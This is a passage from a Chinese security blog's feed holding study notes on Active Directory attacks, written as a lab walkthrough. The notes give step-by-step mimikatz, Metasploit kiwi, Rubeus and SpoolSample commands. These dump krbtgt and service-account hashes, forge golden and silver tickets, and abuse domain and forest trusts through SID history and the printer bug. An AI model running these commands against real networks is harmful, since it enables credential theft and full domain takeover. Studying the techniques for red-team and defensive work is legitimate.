值，就可以伪造域内任意用户的身份了。</p><h2 id="1、导出-krbtgt-的-NTLM-Hash"><a href="#1、导出-krbtgt-的-NTLM-Hash" class="headerlink" title="1、导出 krbtgt 的 NTLM Hash"></a>1、导出 krbtgt 的 NTLM Hash</h2><p>在 mimikatz 下执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里得到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087</p><p>该命令使用的 dcsync 功能远程转储 AD 里的 ntds.dit，使用 /user 参数，可以只导出指定用户的值。</p><p>或者使用以下命令获取 krbtgt 的 NTLM Hash ，域 SID 值，但该命令无法获取 AES-256 的值</p><pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;patch &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、获取基本信息"><a href="#2、获取基本信息" class="headerlink" title="2、获取基本信息"></a>2、获取基本信息</h2><p>获取域 SID</p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里得到 administrator 的 SID 为  S-1-5-21-284927032-1122706408-2778656994-500，即表示当前域的 SID 就是 S-1-5-21-284927032-1122706408-2778656994</p><p>获取当前用户的 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询域管理员账号</p><pre class="line-numbers language-none"><code class="language-none">net group &quot;domain admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询域名</p><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、制作黄金票据"><a href="#3、制作黄金票据" class="headerlink" title="3、制作黄金票据"></a>3、制作黄金票据</h2><p>先将票据清空</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;krbtgt:d685b9c4fa2d318a9943ed68948af087 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传递票据并注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、验证权限"><a href="#4、验证权限" class="headerlink" title="4、验证权限"></a>4、验证权限</h2><p>退出 mimikatz ，使用 dir 发现可以成功列出域控文件</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109271559013.png"></p><p>这里使用 PsExec 也同样是能获取到权限的，除了上面使用 NTLM Hash 之外，还可以使用 krbtgt 的 AES-256 值生成黄金票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;aes256:3dfa1f9b5809250a7670c12d1e109f0acb9660f902da8aa3a4be55a16affbbd5 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令完成之后，也会生成一个 Administrator.kiribi 文件，之后的操作就都一样了。</p><h2 id="5、MSF-下的利用"><a href="#5、MSF-下的利用" class="headerlink" title="5、MSF 下的利用"></a>5、MSF 下的利用</h2><p>首先上线一个普通用户，然后加载 kiwi 模块</p><pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成黄金票据</p><pre class="line-numbers language-none"><code class="language-none">golden_ticket_create -d teamssix.com -k d685b9c4fa2d318a9943ed68948af087 -s S-1-5-21-284927032-1122706408-2778656994 -u administrator -t &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将黄金票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos_ticket_use &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注入成功后，进入 Shell 就能查看 dc 里的文件了</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109271628454.png"></p><h1 id="0x29-白银票据"><a href="#0x29-白银票据" class="headerlink" title="0x29 白银票据"></a>0x29 白银票据</h1><h2 id="0、前言-9"><a href="#0、前言-9" class="headerlink" title="0、前言"></a>0、前言</h2><p>白银票据（Sliver Ticket） 不同于黄金票据（Golden Ticket）</p><blockquote><p>Kerberos 协议详解：<a href="https://teamssix.com/210923-151418.html">https://teamssix.com/210923-151418.html</a></p></blockquote><p>白银票据不与密钥分发中心 KDC 交互，因此没有了 Kerberos 认证协议里的前 4 步，通过伪造的票据授予服务 TGS 生成伪造的服务票据  ST 直接与服务器 Server 进行交互。</p><p>白银票据与黄金票据的区别：</p><p>1、白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</p><p>2、白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，因此白银票据更加隐蔽，但白银票据的权限就远不如黄金票据的权限了</p><p>想利用白银票据需要先知道以下信息：</p><ul><li>域名</li><li>域 SID</li><li>目标服务器的 FQDN 即完整的域名</li><li>可利用的服务</li><li>服务账户的 NTLM 哈希</li><li>伪造的用户名即任意用户名</li></ul><h2 id="1、伪造-CIFS-服务权限"><a href="#1、伪造-CIFS-服务权限" class="headerlink" title="1、伪造 CIFS 服务权限"></a>1、伪造 CIFS 服务权限</h2><p>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到 HASH 后，清空当前系统中的票据，防止其他票据干扰</p><pre class="line-numbers language-none"><code class="language-none">klist purge# 或者在 mimikatz 里清除kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 mimikatz 生成伪造的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091330529.png)</code></pre><p>在伪造票据后，使用 dir 命令就能读取到目标的共享服务了。</p><h2 id="2、伪造-LDAP-服务权限"><a href="#2、伪造-LDAP-服务权限" class="headerlink" title="2、伪造 LDAP 服务权限"></a>2、伪造 LDAP 服务权限</h2><p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;dc:dc &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果返回 ERROR 说明当前权限不能进行 dcsync 操作</p><p>接下来生成 LDAP 服务的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:ldap &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091403286.png"></p><h1 id="0x30-跨域安全"><a href="#0x30-跨域安全" class="headerlink" title="0x30 跨域安全"></a>0x30 跨域安全</h1><h2 id="0、前言-10"><a href="#0、前言-10" class="headerlink" title="0、前言"></a>0、前言</h2><p>常见的跨域攻击方法有以下几种：</p><p>i、利用常规的渗透方法，比如 Web 漏洞</p><p>ii、利用已知散列值进行哈希传递或票据传递，因为有可能域内的密码是通用的</p><p>iii、利用域信任关系</p><p>这里主要看第三种：域信任关系</p><p>当有多个域时，不同的域之间想进行资源共享，就需要用到域信任，只有当域之间互相信任后，才能进行资源共享。</p><p>域信任关系可分为单向信任和双向信任。单向信任即 A 信任 B，但 B 不信任 A，双向信任同理。在创建子域时，系统会在新的子域和父域之间自动创建双向可传递信任关系。</p><p>域信任关系又可分为内部信任和外部信任。内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的；外部信任指不同林之间域的信任关系，这种信任关系要视林间信任类型来判断是不是可传递。</p><p>在 Windows 操作系统中，只有 Domain Admins 组中的用户可以管理域信任关系；Enterprise Admins 组（仅出现在林的根域中）的成员对林中所有域拥有完全控制权限，默认情况下，该组包含林中所有域控上具有 administrators 权限的成员。</p><h2 id="1、获取域信息"><a href="#1、获取域信息" class="headerlink" title="1、获取域信息"></a>1、获取域信息</h2><p>这里使用工具 lg 进行域内信息的收集，lg 是一款用 C++ 编写的用于管理本地用户组和域本地用户组的命令行工具，可用它来收集远程主机用户和组的信息。</p><p>枚举 teamssix 域中的用户组</p><pre class="line-numbers language-none"><code class="language-none">lg.exe teamssix\.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程计算机的用户组，如果提示拒绝访问，说明没有信任关系</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程计算机的用户名</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程系统中全部用户的 SID</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程系统指定组中的所有成员的 SID</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc\administrators -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、利用域信任密钥获取目标域权限"><a href="#2、利用域信任密钥获取目标域权限" class="headerlink" title="2、利用域信任密钥获取目标域权限"></a>2、利用域信任密钥获取目标域权限</h2><p>这里环境信息为：</p><p>父域的域控：dc.teamssix.com</p><p>子域的域控：subdc.sub.teamssix.com</p><p>子域内的计算机：user4.sub.teamssix.com</p><p>子域内的普通用户：user4</p><p>在子域的域控中使用 mimikatz 获取需要的信息</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:administrator&quot; &quot;lsadump::trust &#x2F;patch&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到当前域的 SID 、父域的 SID 和子域域管 NTLM 哈希后，在子域的普通用户机器上利用 mimikatz 制作信任票据</p><blockquote><p>这里的 sids 是父域的 sid，sids 后的 519 表示创建的用户属于父域的管理员组</p></blockquote><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::golden &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;rc4:5bfd59b5e1f78a794f714af07eac869f &#x2F;user:administrator &#x2F;service:krbtgt &#x2F;target:teamssix.com &#x2F;ticket:subdc_administrator.kirbi&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 利用刚刚制作的信任票据获取目标域中目标服务的 TGS 并保存到文件中</p><pre class="line-numbers language-none"><code class="language-none">asktgs subdc_administrator.kirbi cifs&#x2F;dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将获取的 TGS 票据注入到内存中</p><pre class="line-numbers language-none"><code class="language-none">kirbikator lsa cifs.dc.teamssix.com.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 dir 访问目标域控</p><pre class="line-numbers language-none"><code class="language-none">dir \\dc.teamssix.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110211307519.png"></p><h2 id="3、利用-krbtgt-散列值获取目标域的权限"><a href="#3、利用-krbtgt-散列值获取目标域的权限" class="headerlink" title="3、利用 krbtgt 散列值获取目标域的权限"></a>3、利用 krbtgt 散列值获取目标域的权限</h2><p>如果攻击者获取了林内任意域的 krbtgt 散列值，就可以使用 sidHistory 获得该林的完整权限。</p><p>首先获取当前子域和父域的 SID 值，可以使用以下工具或命令</p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get caption,sidwhoami &#x2F;useradfind.exe -sc u:user4 | findstr SidGet-DomainSID sub.teamssix.com  # PowerView 里的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来获取子域的 krbtgt 的哈希值，使用 mimikatz 即可</p><pre class="line-numbers language-none"><code class="language-none">mimikatz privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:krbtgt&quot; sekurlsa::krbtgt exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在子域普通用户权限的计算机中构造黄金票据</p><pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;krbtgt:b53a5c7c51648f033b96971e7ae4ee45 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110211315739.png"></p><h2 id="4、利用无约束委派和-MS-RPRN-获取信任林权限"><a href="#4、利用无约束委派和-MS-RPRN-获取信任林权限" class="headerlink" title="4、利用无约束委派和 MS-RPRN 获取信任林权限"></a>4、利用无约束委派和 MS-RPRN 获取信任林权限</h2><p>如果已经获取了域林中某个域控权限，或者配置了无约束委派的任何服务器的权限，那么就可以使用 MS RPRN 的 RpcRemoteFindPrinterChangeNotification(Ex) 方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，利用捕获的票据获取信任林内任意用户的哈希值。</p><p>假设这里获取了 teamssix.com 域的域控权限，且 0day.org 与 teamssix.com 域有林信任关系</p><p>首先在 teamssix.com 的域控上监听身份认证请求</p><pre class="line-numbers language-none"><code class="language-none">rubeus.exe monitor &#x2F;interval:5 &#x2F;filteruser:OWA2010SP3$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">interval: 用于设置监控的时间间隔filteruser: 用于指定需要关注的主机，这里的 OWA2010SP3 是 0day.org 域控的主机名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启监听后，使用 SpoolSample 工具让 OWA2010SP3.0day.org 向 dc.teamssix.com 发送身份认证请求</p><pre class="line-numbers language-none"><code class="language-none">SpoolSample.exe OWA2010SP3.0day.org dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得票据后，使用 rubeus 将票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">rubeus.exe ptt &#x2F;ticket:&lt;TGT 票据&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 mimikatz 获取目标的 krbtgt 散列值</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:0day.org &#x2F;user:0day\krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来，构造黄金票据并将其注入内存，就能够获得 0day.org 域控的权限了</p><pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:0day.org &#x2F;sid:5-1-5-21-1812920812-2335051732-3517558806 &#x2F;rc4:b53a5c8c51648f053b96971e7ae4ee25 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x31-后记"><a href="#0x31-后记" class="headerlink" title="0x31 后记"></a>0x31 后记</h1><p>自 2021年 2 月 3 日发布内网学习笔记第一节笔记开始，已经过去了大半年的时间，虽然是 2021 年 2 月 3 号发布文章，但实际上早在 2020 年的 10 月份就已经开始购入《内网安全攻防》这本书，并打算开始学习内网了，这样算下来到今年的 10 月份，正好一年的时间，这一年来发现真的是越学越感觉自己所掌握的知识太少，而自己只不过刚刚接触了点皮毛而已，这门艺术又是如此的迷人，吸引着自己不断去学习、探索。</p><p>在此感谢 MS 08067 实验室里的徐焱、贾晓璐所编写的《内网安全攻防》，感谢每篇笔记最后参考链接的作者们，感谢曾经帮助我解决所碰到问题的大佬们，正是有你们这些前人才使得我们后人有了学习的方向以及参考，谢谢你们。</p><blockquote><p>最后，还有一点要注意的就是， 内网学习笔记系列只是我个人在学习内网的过程中所做的笔记，建议不要当做教程看，因为其中我本身已经知道的知识点和感觉不重要知识点我是没有记录的。</p><p>将自己的笔记公开发出来的目的有二：一是便于自己遗忘时随时查找，这也是17年我建立这个公众号的主要目的；二是在笔记中我会记录一些坑的解决方法，如果你碰到和我一样的问题，或许我这小菜鸟写的笔记就能帮助到你。</p></blockquote><p>希望我的这一点学习笔记，也能帮助到想要学习内网的后人们。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>原文链接：<a href="https://www.teamssix.com/211027-163641.html">https://www.teamssix.com/211027-163641.html</a></p><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a><br><a href="https://xz.aliyun.com/t/7311">https://xz.aliyun.com/t/7311</a><br><a href="https://xz.aliyun.com/t/7875">https://xz.aliyun.com/t/7875</a><br><a href="https://bipy.me/post/crack-rar/">https://bipy.me/post/crack-rar/</a><br><a href="https://ehang-io.github.io/nps/">https://ehang-io.github.io/nps/</a><br><a href="https://baike.baidu.com/item/DMZ">https://baike.baidu.com/item/DMZ</a><br><a href="https://baike.baidu.com/item/AGDLP">https://baike.baidu.com/item/AGDLP</a><br><a href="https://www.jianshu.com/p/23a4e8978a30">https://www.jianshu.com/p/23a4e8978a30</a><br><a href="https://www.jianshu.com/p/27730ab4a6db">https://www.jianshu.com/p/27730ab4a6db</a><br><a href="https://www.jianshu.com/p/331aa59fff5d">https://www.jianshu.com/p/331aa59fff5d</a><br><a href="https://www.jianshu.com/p/a210528f9b35">https://www.jianshu.com/p/a210528f9b35</a><br><a href="https://www.jianshu.com/p/c8f5c374466a">https://www.jianshu.com/p/c8f5c374466a</a><br><a href="https://www.sqlsec.com/2019/10/nc.html">https://www.sqlsec.com/2019/10/nc.html</a><br><a href="https://evi1cg.me/archives/Powerup.html">https://evi1cg.me/archives/Powerup.html</a><br><a href="https://www.anquanke.com/post/id/184855">https://www.anquanke.com/post/id/184855</a><br><a href="https://baike.baidu.com/item/NTLM/6371298">https://baike.baidu.com/item/NTLM/6371298</a><br><a href="https://www.hi-linux.com/posts/61543.html">https://www.hi-linux.com/posts/61543.html</a><br><a href="https://baike.baidu.com/item/LLMNR/1116392">https://baike.baidu.com/item/LLMNR/1116392</a><br><a href="https://www.freebuf.com/sectool/158393.html">https://www.freebuf.com/sectool/158393.html</a><br><a href="https://www.freebuf.com/sectool/179002.html">https://www.freebuf.com/sectool/179002.html</a><br><a href="https://www.freebuf.com/sectool/210450.html">https://www.freebuf.com/sectool/210450.html</a><br><a href="https://www.sqlsec.com/2019/10/hashcat.html">https://www.sqlsec.com/2019/10/hashcat.html</a><br><a href="https://www.freebuf.com/articles/246440.html">https://www.freebuf.com/articles/246440.html</a><br><a href="https://baike.baidu.com/item/Windows%E5%9F%9F">https://baike.baidu.com/item/Windows%E5%9F%9F</a><br><a href="https://www.cnblogs.com/lfoder/p/8241548.html">https://www.cnblogs.com/lfoder/p/8241548.html</a><br><a href="https://www.cnblogs.com/Xy--1/p/13216686.html">https://www.cnblogs.com/Xy–1/p/13216686.html</a><br><a href="https://zh.wikipedia.org/wiki/Active_Directory">https://zh.wikipedia.org/wiki/Active_Directory</a><br><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97">https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97</a><br><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91">https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91</a><br><a href="https://www.cnblogs.com/micr067/p/12263337.html">https://www.cnblogs.com/micr067/p/12263337.html</a><br><a href="https://www.cnblogs.com/micr067/p/12307519.html">https://www.cnblogs.com/micr067/p/12307519.html</a><br><a href="https://www.cnblogs.com/zpchcbd/p/11707302.html">https://www.cnblogs.com/zpchcbd/p/11707302.html</a><br><a href="https://www.cnblogs.com/frendguo/p/11761693.html">https://www.cnblogs.com/frendguo/p/11761693.html</a><br><a href="https://www.cnblogs.com/websecyw/p/11835830.html">https://www.cnblogs.com/websecyw/p/11835830.html</a><br><a href="https://www.freebuf.com/articles/web/251389.html">https://www.freebuf.com/articles/web/251389.html</a><br><a href="https://www.freebuf.com/articles/web/274035.html">https://www.freebuf.com/articles/web/274035.html</a><br><a href="https://www.freebuf.com/articles/web/280406.html">https://www.freebuf.com/articles/web/280406.html</a><br><a href="https://y4er.com/post/kerberos-kerberoasting-spn">https://y4er.com/post/kerberos-kerberoasting-spn</a><br><a href="https://www.cnblogs.com/lavender000/p/6931405.html">https://www.cnblogs.com/lavender000/p/6931405.html</a><br><a href="https://cloud.tencent.com/developer/article/1043370">https://cloud.tencent.com/developer/article/1043370</a><br><a href="https://cloud.tencent.com/developer/article/1170758">https://cloud.tencent.com/developer/article/1170758</a><br><a href="https://cloud.tencent.com/developer/article/1752145">https://cloud.tencent.com/developer/article/1752145</a><br><a href="https://cloud.tencent.com/developer/article/1752180">https://cloud.tencent.com/developer/article/1752180</a><br><a href="https://cloud.tencent.com/developer/article/1752212">https://cloud.tencent.com/developer/article/1752212</a><br><a href="https://cloud.tencent.com/developer/article/1760135">https://cloud.tencent.com/developer/article/1760135</a><br><a href="https://cloud.tencent.com/developer/article/1772183">https://cloud.tencent.com/developer/article/1772183</a><br><a href="https://www.freebuf.com/articles/system/114731.html">https://www.freebuf.com/articles/system/114731.html</a><br><a href="https://www.freebuf.com/articles/system/194549.html">https://www.freebuf.com/articles/system/194549.html</a><br><a href="https://baike.baidu.com/item/Windows%20Power%20Shell">https://baike.baidu.com/item/Windows%20Power%20Shell</a><br><a href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a><br><a href="https://www.freebuf.com/articles/network/261454.html">https://www.freebuf.com/articles/network/261454.html</a><br><a href="https://blog.csdn.net/henter/article/details/80079531">https://blog.csdn.net/henter/article/details/80079531</a><br><a href="https://www.cnblogs.com/coderge/articles/13768824.html">https://www.cnblogs.com/coderge/articles/13768824.html</a><br><a href="https://blog.csdn.net/nathan8/article/details/108804056">https://blog.csdn.net/nathan8/article/details/108804056</a><br><a href="https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84">https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84</a><br><a href="https://blog.csdn.net/wulantian/article/details/42418231">https://blog.csdn.net/wulantian/article/details/42418231</a><br><a href="https://blog.csdn.net/bring_coco/article/details/113550173">https://blog.csdn.net/bring_coco/article/details/113550173</a><br><a href="https://blog.csdn.net/qq_32393893/article/details/108904697">https://blog.csdn.net/qq_32393893/article/details/108904697</a><br><a href="https://blog.csdn.net/qq_34640691/article/details/111881910">https://blog.csdn.net/qq_34640691/article/details/111881910</a><br><a href="https://blog.csdn.net/qq_36279445/article/details/110647055">https://blog.csdn.net/qq_36279445/article/details/110647055</a><br><a href="https://blog.csdn.net/qq_45742511/article/details/117301437">https://blog.csdn.net/qq_45742511/article/details/117301437</a><br><a href="https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996">https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996</a><br><a href="https://blog.csdn.net/weixin_44064908/article/details/103920329">https://blog.csdn.net/weixin_44064908/article/details/103920329</a><br><a href="https://blog.csdn.net/weixin_45116657/article/details/103449931">https://blog.csdn.net/weixin_45116657/article/details/103449931</a><br><a href="https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/">https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/</a><br><a href="https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95">https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95</a><br><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a><br><a href="https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/">https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/</a><br><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a><br><a href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a><br><a href="https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/">https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;自 2020 年 11 月份至 2021 年 10 月份，在这近一年的时间里，笔者更新了自己在学习内</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】30、跨域安全（完结）</title>
    <link href="https://www.teamssix.com/211022-122217.html"/>
    <id>https://www.teamssix.com/211022-122217.html</id>
    <published>2021-10-22T04:22:17.000Z</published>
    <updated>2021-11-22T08:59:50.297Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>常见的跨域攻击方法有以下几种：</p><p>i、利用常规的渗透方法，比如 Web 漏洞</p><p>ii、利用已知散列值进行哈希传递或票据传递，因为有可能域内的密码是通用的</p><p>iii、利用域信任关系</p><p>这里主要看第三种：域信任关系</p><p>当有多个域时，不同的域之间想进行资源共享，就需要用到域信任，只有当域之间互相信任后，才能进行资源共享。</p><p>域信任关系可分为单向信任和双向信任。单向信任即 A 信任 B，但 B 不信任 A，双向信任同理。在创建子域时，系统会在新的子域和父域之间自动创建双向可传递信任关系。</p><p>域信任关系又可分为内部信任和外部信任。内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的；外部信任指不同林之间域的信任关系，这种信任关系要视林间信任类型来判断是不是可传递。</p><p>在 Windows 操作系统中，只有 Domain Admins 组中的用户可以管理域信任关系；Enterprise Admins 组（仅出现在林的根域中）的成员对林中所有域拥有完全控制权限，默认情况下，该组包含林中所有域控上具有 administrators 权限的成员。</p><h2 id="1、获取域信息"><a href="#1、获取域信息" class="headerlink" title="1、获取域信息"></a>1、获取域信息</h2><p>这里使用工具 lg 进行域内信息的收集，lg 是一款用 C++ 编写的用于管理本地用户组和域本地用户组的命令行工具，可用它来收集远程主机用户和组的信息。</p><p>枚举 teamssix 域中的用户组</p><pre class="line-numbers language-none"><code class="language-none">lg.exe teamssix\.<span aria-hidden="true" 